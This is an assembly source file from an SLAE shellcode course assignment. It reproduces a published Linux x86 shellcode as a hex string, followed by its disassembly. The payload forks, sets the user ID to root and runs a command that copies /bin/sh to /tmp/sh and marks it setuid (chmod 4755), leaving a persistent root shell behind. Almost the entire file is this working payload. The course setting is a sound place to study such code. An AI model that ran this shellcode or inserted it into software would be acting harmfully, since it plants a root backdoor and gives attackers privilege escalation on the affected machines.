;; SLAE Assignment #6: original shellcode cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh
;; Website:  http://blog.jsiob.com
;; SLAE-ID: 1400
;; ShellCode: http://shell-storm.org/shellcode/files/shellcode-540.php
;; Shellcode: "\x29\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x02\xeb\x05\x29\xc0\x40\xcd\x80\x29\xc0\x29\xdb\x29\xc9\xb0\x46\xcd\x80\xeb\x2a\x5e\x89\x76\x32\x8d\x5e\x08\x89\x5e\x36\x8d\x5e\x0b\x89\x5e\x3a\x29\xc0\x88\x46\x07\x88\x46\x0a\x88\x46\x31\x89\x46\x3e\x87\xf3\xb0\x0b\x8d\x4b\x32\x8d\x53\x3e\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x63\x20\x63\x70\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2f\x74\x6d\x70\x2f\x73\x68\x3b\x20\x63\x68\x6d\x6f\x64\x20\x34\x37\x35\x35\x20\x2f\x74\x6d\x70\x2f\x73\x68"


global _start			

section .text
_start:

	sub eax,eax
	mov al,0x2
	int 0x80
	test eax,eax
	jnz 0xc
	jmp short 0x11
	sub eax,eax
	inc eax
	int 0x80
	sub eax,eax
	sub ebx,ebx
	sub ecx,ecx
	mov al,0x46
	int 0x80
	jmp short 0x47
	pop esi
	mov [esi+0x32],esi
	lea ebx,[esi+0x8]
	mov [esi+0x36],ebx
	lea ebx,[esi+0xb]
	mov [esi+0x3a],ebx
	sub eax,eax
	mov [esi+0x7],al
	mov [esi+0xa],al
	mov [esi+0x31],al
	mov [esi+0x3e],eax
	xchg esi,ebx
	mov al,0xb
	lea ecx,[ebx+0x32]
	lea edx,[ebx+0x3e]
	int 0x80
	call dword 0x1d
	das
	bound ebp,[ecx+0x6e]
	das
	jnc 0xbb
	and [dword 0x70632063],ch
	and [edi],ch
	bound ebp,[ecx+0x6e]
	das
	jnc 0xc9
	and [edi],ch
	jz 0xd2
	jo 0x96
	jnc 0xd1
	cmp esp,[eax]
	arpl [eax+0x6d],bp
	outsd
	and [fs:edi+esi],dh
	xor eax,0x742f2035
	insd
	jo 0xaa
	jnc 0xe5
